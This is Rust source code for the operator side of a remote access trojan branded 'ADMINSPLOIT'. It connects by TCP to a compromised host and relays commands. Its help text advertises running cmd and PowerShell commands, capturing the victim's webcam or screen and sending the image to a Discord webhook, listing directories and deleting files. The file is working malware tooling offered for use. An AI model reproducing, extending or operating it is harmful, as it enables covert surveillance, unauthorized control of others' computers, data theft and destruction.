use std::net::{TcpStream};
use std::io::{Read, Write, stdin, stdout};
use std::borrow::Cow;
mod clear;
fn main() {
    let mut buffer = [0 as u8; 1024*20];
    let mut t = term::stdout().unwrap();
    let mut host_buffer = [0 as u8; 50];
    let help = "
sys:{command} -> Execute any cmd command.
(Will not work on commands that require user input. Make sure the command can be executed.)
shell:{command} -> Execute any powrshell command.

capture:{webcam/screen} -> Captures an image of the hosts's computer screen or webcam 
and sends the picture to your discord webhook. (File transfer may take some time.)

clear -> Clears the console

cd:{path} -> Changes the current directory of the host machine.

listdir:{path} -> Lists all files and folders in a directory.

del:{path} -> Removes a file.
    ";
    t.fg(term::color::RED).unwrap();
    let logo = r"
 
     █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
    ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║███████╗██████╔╝██║     ██║   ██║██║   ██║   
    ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║███████║██║     ███████╗╚██████╔╝██║   ██║   
    ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ ";
    println!("{}", logo);
    loop {
        let mut ip=String::new();
        print!("\nEnter ip to connect to: ");       
        let _=stdout().flush();
        stdin().read_line(&mut ip).expect("Did not enter a correct string");
        if let Some('\n')=ip.chars().next_back() {
            ip.pop();
        }
        if let Some('\r')=ip.chars().next_back() {
            ip.pop();
        }
        let mut port=String::new();
        print!("Enter port: ");       
        let _=stdout().flush();
        stdin().read_line(&mut port).expect("Did not enter a correct string");
        if let Some('\n')=port.chars().next_back() {
            port.pop();
        }
        if let Some('\r')=port.chars().next_back() {
            port.pop();
        }
        
        t.fg(term::color::CYAN).unwrap();
        loop {
            println!("\nConnecting to the host..");
        match TcpStream::connect(format!("{}:{}", ip, port)) {
            Ok(mut stream) => {
                //stream.set_read_timeout(Some(time::Duration::from_secs(3))).unwrap();
                println!("Successfully connected to {} in port {}\nType help for commands and info.\n", ip, port);
                let hostname = match stream.read(&mut host_buffer) {
                    Ok(size) => {
                        let host = String::from_utf8_lossy(&host_buffer[0..size]);
                        host
                    }
                    Err(_) => {
                        let unkwn = Cow::from("Unknown host");
                        unkwn
                    },
                };        
                
                loop {
                    let mut s=String::new();
                    print!("{}>", hostname.trim());
                    
                    let _=stdout().flush();
                    stdin().read_line(&mut s).expect("Did not enter a correct string");
                    if let Some('\n')=s.chars().next_back() {
                        s.pop();
                    }
                    if let Some('\r')=s.chars().next_back() {
                        s.pop();
                    }
                    let curr_msg = &s;

                    if curr_msg == "help" {
                            t.fg(term::color::YELLOW).unwrap();
                            println!("{}", help);
                            t.fg(term::color::CYAN).unwrap(); 
                            continue;   
                    } else if curr_msg == "clear" {
                        clear::clear();
                        t.fg(term::color::RED).unwrap();
                        println!("{}\n\n", logo);
                        t.fg(term::color::CYAN).unwrap();
                        println!("Type help for commands and info.\n");
                        continue;
                    }

                    match curr_msg.find(":") {
                        Some(curr_msg) => curr_msg,
                        None => continue,
                    };
                    let msg = s.as_bytes();
                    match stream.write(msg) {
                        Ok(_) => {
                            
                                match stream.read(&mut buffer) {
                                    Ok(size) => {
                                        
                                            let text = String::from_utf8_lossy(&buffer[0..size]);
                                            t.fg(term::color::YELLOW).unwrap();
                                            println!("Received string: {}", text );
                                            t.fg(term::color::CYAN).unwrap();
                                    
                                    }
                                    Err(e) => println!("There was an error receiving data: {}", e),
                                }
                            
                        },
                        Err(e) => println!("There was an error sending the command: {}", e),
                    }
                }
            },
                
            Err(e) => {
                t.fg(term::color::RED).unwrap();
                println!("There was an error connecting with the host machine, please try again. Error details: {}\n", e);
                break;
            }
        }
        }
        continue;
    }
}
